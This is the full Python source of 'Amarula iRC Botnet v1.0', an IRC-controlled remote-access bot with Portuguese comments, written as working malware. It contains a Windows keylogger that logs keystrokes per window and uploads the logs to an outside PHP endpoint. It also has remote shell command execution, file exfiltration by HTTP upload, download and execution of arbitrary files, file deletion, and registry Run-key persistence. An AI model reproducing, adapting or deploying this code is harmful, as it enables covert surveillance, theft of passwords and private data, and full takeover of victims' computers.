#!/usr/bin/python
# -*-coding:utf-8-*-
# coder: _carlosnericorreia_(badfly)
# email: hackerama@protonmail.com
# Amarula iRC Botnet v1.0 - Abacatch Version


#######################################################################################################################
#                                                                                                                     #
# -----------------------------------[+] A M A R U L A    I R C    B O T N E T [+] -----------------------------------#
#                                                  Abacatch Version                                                   #
#                                                                                                                     #
#######################################################################################################################

import glob                                       # Funcao listArq()
import os                                         # Funcoes deleteFile(), listArq(), upload(),
import platform                                   # Variavel pcName
import pyHook, pythoncom                          # Funcoes keylog(), onKey(event)
import random                                     # Variavel pcName
import requests                                   # Funcao upload()
import re                                         # Funcao getPublicIp()
import socket                                     # Funcoes  conn(), ipLocal()
import subprocess                                 # Funcao run()
import sys                                        # Opcao matar
from urllib import urlopen                        # Funcao getPublicIp()
import urllib,urllib2                             # Funcao download()
import time                                       # Funcoes listArq(), shell(), main()
import threading                                  # Funcao onKey(event)

# --------------------------------------------------------------------------------------------------------------------#
#                                              C O N F I G U R A C O E S                                              #
# --------------------------------------------------------------------------------------------------------------------#

ircServer= "chat.freenode.net"                             # Endereco do servidor IRC.
ircChanne= "#amarula4242"                                  # Canal ao qual o Zumbi ira se conectar.
ircPwdCha= "@nolimits42"                                   # Password do canal, caso nao haja, deixar em branco.
botAdmi= "Papa Father"                                     # Nome que os Zumbis usarao para chamar voce (n. obrigatorio)
botPass= "raise"                                           # Password para se conectar aos bots no canal
urlUpload = "http://cardinal-restaurant.000webhostapp.com/upload.php"                # Array PHP que ira receber os arquivos via upload
urlStrip = urlUpload.strip('http:upload.php')              # Exibe a URL do dos arquivos upados
ldir = os.getcwd()+'\storage'                                      # Pasta onde sera salvo o arquivo de log local no cliente
window = None                                              # Funcao onKey(event) para capturar o nome da janela
data = ''                                                  # Funcao onKey(event) para tratar os dados capturados
head = ''                                                  # Para definir o cabecalho da janela capturada no log.txt
dump = []                                                  # Contador de caracteres, com 100 sobe o log pro Server
date = time.strftime("%d/%m/%Y")+' - '+time.strftime("%X") # Data e hora no cabecalho de janelo no log.txt
pcname = platform.node()                                   # Nome do PC
pcos = platform.platform()                                 # Nome do OS
pcprocess = platform.processor()                           # Descricao do Processador
fileup = ldir + '\capt-' + pcname + '.txt'                 # Auxiliar da funcao upload2(fileup)
botNick = pcname + "-" + str(random.randint(1, 10000))     # Nick do bot no IRC


# --------------------------------------------------------------------------------------------------------------------#
#                                        F U N C O E S   O P E R A C I O N A I S                                      #
# --------------------------------------------------------------------------------------------------------------------#

def conn():
# Inicia a conexao com o IRC

	try:
		ircSock.connect((ircServer, 6665)) #6667
	except socket.error:
		conn()
	else:
		ircSock.send(str.encode("USER "+ botNick +" "+ botNick +" "+ botNick +" :ZuMbI\n"))
		ircSock.send(str.encode("NICK "+ botNick +"\n"))

def deleteFile():
# Deleta um arquivo

	try:
		localisfile = glob.glob(delFile)
		if os.path.exists(delFile):
			for localisfile in localisfile:
				os.unlink(localisfile)
				EnviaMsg(ircChanne, "[+] Arquivo deletado com sucesso  " + "[ " + localisfile + " ] [+]")
		else:
			EnviaMsg(ircChanne, "[!] Ops! O arquivo nao existe " + "[ " + delFile + " ] [!]")
	except WindowsError:
		EnviaMsg(ircChanne, "[!] Porra! Nao foi possivel deletar o arquivo, provavelmente voce teve permissao negada [!]")
		EnviaMsg(ircChanne, str(WindowsError))

def download():
# Faz o download de um arquivo via requisicao HTTP

	if urlDown.find("http://")!= -1 or urlDown.find("https://")!= -1:
		try:
			file_name = urlDown.split('/')[-1]
			u = urllib2.urlopen(urlDown)
			f = open(file_name, 'wb')
			meta = u.info()
			file_size = int(meta.getheaders("Content-Length")[0])
			EnviaMsg(ircChanne, "[+] Baixando para o bot: %s - Tamanho: %s Bytes [+]" % (file_name, file_size))
			f.write(u.read())
			f.close()
			EnviaMsg(ircChanne, "[+] Download finalizado de: " + str(file_name) + " [+]")
		except IOError:
			EnviaMsg(ircChanne, "[!] Papa, Seu inutil! Voce nao tem privilegio para fazer o download. [!]")
	else:
		EnviaMsg(ircChanne, "Ops! Tente usar [http://] ou [https://] na URL")


def getPublicIp():
# Obtem o IP publico do zumbi

	dataIp = str(urlopen('http://checkip.dyndns.com/').read())
	return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(dataIp).group(1)

def ipLocal():
# Obtem o IP local do zumbi

	addresses = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1]
	return addresses

def keylog():
# Funcao principal do keylogger

	global ldir

	try:
		os.mkdir(ldir)
	except Exception as e:
		print 'Excecao:', e
		pass

	file = open(ldir + '\capt-' + pcname + '.txt', 'a')
	file.write('\n[+]'+('-'*64+'[+]\n'))
	file.write('   AbaCatch Keylogger v1.0\n   _Ora, ora, parece que temos um xeroque rolmes aqui_\n\n')
	file.write('   DATA E HORA: ' + date + '\n')
	file.write('   NOME DO USUARIO: ' + pcname + '\n')
	file.write('   SISTEMA OPERACIONAL: ' + pcos + '\n')
	file.write('   PROCESSADOR: ' + pcprocess + '\n')
	file.write('[+]' + ('-'*64 + '[+]\n'))
	file.close()

	hooks_manager = pyHook.HookManager()
	hooks_manager.KeyDown = onkey
	hooks_manager.HookKeyboard()
	pythoncom.PumpMessages()

def listArq():
# Lista os arquivos do diretorio atual

	file = glob.glob('*.*')

	for file in file:
		EnviaMsg(ircChanne, "Arquivo: [ " + file + " " + str(os.path.getsize(file)) + " kb ]")
		time.sleep(0.8)

def onkey(event):
# Funcao qee sera chamada pelo 'hook_manager' toda vez que uma tecla for pressionada.

    global head
    global data
    global window
    global dump
    global ldir

    file = open(ldir + '\capt-' + pcname + '.txt', 'a')

    if event.WindowName != window:
        window = event.WindowName
        head = '\n\n[+] ' + window + ' - ' + date + '\n\n'
        file.write(head)

    if event.Ascii == 13:
        data = ' <ENTER>\n'
        file.write(data)
    elif event.Ascii == 8:
        data = ' <BACK SPACE> '
        file.write(data)
    elif event.Ascii == 9:
        data = ' <TAB>'
        file.write(data)
    else:
        data = chr(event.Ascii)
        file.write(data)
        file.close()

    dump.append(data)

    if len(dump) > 100:
        # print ('tamanho de dump:', len(dump))
        t = threading.Thread(target=upload2, args=(fileup,))
        t.daemon = True
        t.start()
        dump = []
    return dump

def persis():
# Cria uma persistencia no registro do Windows

	try:
		conv = os.path.realpath(__file__).replace('.py', '.exe')
		subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Amarula /t REG_SZ /f /d '+"'"+conv+"'", shell=True)
		EnviaMsg(ircChanne, "[+] Registro alterado com sucesso [+]")
	except:
		EnviaMsg(ircChanne, "[+] Nao foi possivel alterar o registro [+]")

def run():
# Executa um arquivo no cliente

	if os.path.isfile(str(fileRun)) == True:
		subprocess.call(['start', fileRun], shell=True)
		EnviaMsg(ircChanne, fileRun + " executado com sucesso.")
	else:
		EnviaMsg(ircChanne, fileRun + " arquivo nao existe.")

def shell():
# Habilita comandos shell

	try:
		process = subprocess.Popen(args=comando,stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell= True)
		outt = (process.communicate())
		out2 = outt[0]
		out3 = out2.split('\r\n')
		for item in (out3):
			item = item.replace("\x82", "?")
			item = item.replace("\xc6", "?")
			item = item.replace("\xa3", "?")
			item = item.replace("\xa1", "?")
			item = item.replace("\xa2", "?")
			item = item.replace("\x87", "?")
			item = item.replace("\x93", "?")
			item = item.replace("\xa0", "?")
			item = item.replace("\x88", "?")
			item = item.replace("\x83", "?")
			item = item.replace("\xc7", "?")
			item = item.replace("\xb8", "?")
			item = item.replace("\xad", "?")
			item = item.replace("\xef", "?")
			item = item.replace("\xa7", "?")
			item = item.replace("\xf5", "?")
			item = item.replace("\xf0", "?")
			item = item.replace("\xfc", "?")
			item = item.replace("\xa6", "?")
			EnviaMsg(ircChanne, item )
			time.sleep(1)
	except:
		EnviaMsg(ircChanne, "[!] Ocorreu um erro na execucao do comando [!]")

def upload():
# Faz o upload de um arquivo do cliente para um servidor HTTP

	global urlUpload, urlStrip

	if os.path.exists(fileUp):
		files = {'file': open(fileUp, 'rb')}
		r = requests.post(urlUpload, files=files) #import requests
		EnviaMsg(ircChanne, "[+] Upload concluido com sucesso [+] para http:"+urlStrip + fileUp)
	else:
		EnviaMsg(ircChanne, "[+] Apenas o vazio da existencia: O arquivo nao existe [+]" + "[ " + fileUp + " ]")

def upload2(fileup):
# funcao responsavel pelo upload do arquivo de log para o servidor

    global urlUpload
    if os.path.exists(fileup):
            files = {'file': open(fileup, 'rb')}
            requests.post(urlUpload, files=files)

# --------------------------------------------------------------------------------------------------------------------#
#                                          F U N C O E S   A U X I L I A R E S                                        #
# --------------------------------------------------------------------------------------------------------------------#

def ping():
	ircSock.send (str.encode("PONG :pingis\n"))

def EnviaMsg(chan, msg):
	ircSock.send(str.encode("PRIVMSG " + chan +" :" + msg + "\n"))

def join(chan):
	ircSock.send(str.encode("JOIN " + chan + " " + ircPwdCha + "\n"))

def leaveChannel(chan):
	ircSock.send(str.encode("PART " + chan + " leaving the canal" + "\n"))

def quitIrc(chan):
	ircSock.send(str.encode("QUIT" + "\n"))


# --------------------------------------------------------------------------------------------------------------------#
#                                            F U N C A O   P R I N C I P A L                                          #
# --------------------------------------------------------------------------------------------------------------------#

def main():
#Funcao Principal

	global botAdmi, ldir, comando, ircSock, botNick, fileUp, urlDown, fileRun, interval, delFile, outt, out2, out3

	ircSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#time.sleep(40) # Esperar a inicializacao do network card (uncomment to use)
	print ldir
	print type(ldir)
	conn()
	join(ircChanne)
	login = False

	while login != True:
		ircMsg = ircSock.recv(5000)
		ircMsgClean = ircMsg.strip(str.encode('\n\r'))
		ircSock.send(str.encode("NICK " + botNick + "\n"))
		print(ircMsgClean)
		if ircMsg.find(ircMsg.replace("PING ", "PONG")) !=-1:
			ping()
		if ircMsg.find(str.encode("login")) !=-1:
			try:
				p = ircMsgClean.split()
				pwd = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] tente: <login> <senha>")
			else:
				if pwd != botPass:
					EnviaMsg(ircChanne, "[!] Parado ai, vagabundo: Senha Invalida, ou voce nao pode logar [!]")
				else:
					EnviaMsg(ircChanne, "[+] Conectado: bot " + botNick + " aguardando por ordens, Mestre! [+]")
					login = True

	while True:
		ircMsg = ircSock.recv(5000)
		ircMsgClean = ircMsg.strip(str.encode('\n\r'))

		print(ircMsgClean)
		if ircMsg.find(str.encode("Nickname is already in use")) != -1:
			botNick = pc_name + str(random.randint(1,10000))
			ircSock.send(str.encode("NICK "+ botNick +"\n"))
			join(ircChanne)

		elif ircMsg.find(str.encode("keylog start")) != -1:
			try:
				p = ircMsgClean.split()
				id = p[5]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <keylog start> <" + botNick +">")
			else:
				if id == botNick:
					pr = multiprocessing.Process(target=keylog)
					pr.daemon = True
					pr.start()
					EnviaMsg(ircChanne, "[+] Iniciando Keylogger [+]")

		elif ircMsg.find(str.encode("keylog stop")) != -1:
			try:
				p = ircMsgClean.split()
				id = p[5]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <keylog stop> <" + botNick +">")
			else:
				if id == botNick:
					for p in multiprocessing.active_children():
						p.terminate()
						EnviaMsg(ircChanne, "[+] Terminando Keylogger [+]")

		elif ircMsg.find(str.encode("PING :")) != -1:
			ping()

		elif ircMsg.find(str.encode("sair")) != -1:
			leaveChannel(ircChanne)

		elif ircMsg.find(str.encode("matar")) != -1:
			quitIrc(ircChanne)
			sys.exit()

		elif ircMsg.find(str.encode("help")) != -1:
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <help> <" + botNick +">")
			else:
				if id == botNick:
					EnviaMsg(ircChanne, "[+] Bem Vindo, Mestre " + botAdmi + " [+]")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [matar]         para matar os bots ativos")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [sair]          para que os bots ativos saiam do canal")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [dir]           para vizualizar o diretorio atual do zumbi")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [ls]            para listar o conteudo da pasta atual")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [ip]            para mostrar os ips do bot")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [upload]        para fazer upload de arquivos do bot")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [download]      para baixar arquivos para o zumbi")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [run]           para executar um programa")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [shell]         para executar comandos no terminal")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [delete]        para excluir arquivos")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [start keylog]  para ativar o keylogger")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [stop keylog]   para desativar o keylogger")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [persistence]   para instalar persistencia no registro do Windows")

		elif ircMsg.find(str.encode("botnick")) != -1:
			EnviaMsg(ircChanne, "Nickname: " + botNick)

		elif ircMsg.find(str.encode("dir")) != -1:
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <dir> <" + botNick +">")
			else:
				if id == botNick:
					EnviaMsg(ircChanne, "[+] Diretorio atual do zumbi: " + os.getcwd())

		elif ircMsg.find(str.encode("ls")) != -1:
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <ls> <" + botNick +">")
			else:
				if id == botNick:
					listArq()

		elif ircMsg.find(str.encode("ip")) != -1:
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <ip> <" + botNick +">")
			else:
				if id == botNick:
					yx = getPublicIp()
					xy = ipLocal()
					EnviaMsg(ircChanne, "IP Local: " + str(xy) +  " Ip Externo: " + "['" + yx + "']"  )

		elif ircMsg.find(str.encode("upload")) != -1:
			try:
				p = ircMsgClean.split()
				fileUp = p[4]
				id = p[5]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <upload> <Arquivo> <" + botNick +">")
			else:
				if fileUp == fileUp and id == botNick:
					EnviaMsg(ircChanne, "[+] Upload em andamento, aguarde um pouco. [+]")
					upload()

		elif ircMsg.find(str.encode("download")) != -1:
			try:
				p = ircMsgClean.split()
				urlDown = p[4]
				id = p[5]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <download> <link> <"+ botNick +">")
			else:
				if urlDown == urlDown and id == botNick:
					download()

		elif ircMsg.find(str.encode("run")) != -1:
			try:
				p = ircMsgClean.split()
				fileRun = p[4]
				id = p[5]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <run> <programa> <"+ botNick +">")
			else:
				if fileRun == fileRun and id == botNick:
					run()

		elif ircMsg.find(str.encode("delete")) != -1:
			try:
				p = ircMsgClean.split()
				delFile = p[4]
				id = p[5]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <delete> <arquivo> <"+ botNick +">")
			else:
				if delFile == delFile and id == botNick:
					deleteFile()

		elif ircMsg.find(str.encode("shell")) != -1:
			try:
				p = ircMsgClean.split()
				print (p)
				comando = p[4:-1]
				comando = " ".join(comando)
				print (comando)

				id = p[-1]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <shell> <comando> <" + botNick + ">")
			else:
				if comando == comando and id == botNick:
					shell()

		elif ircMsg.find(str.encode("persistence")) != -1: # Para persistencia
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <persistence> <" + botNick +">")
			else:
				if id == botNick:
					persis()

if __name__ == "__main__":
	main()
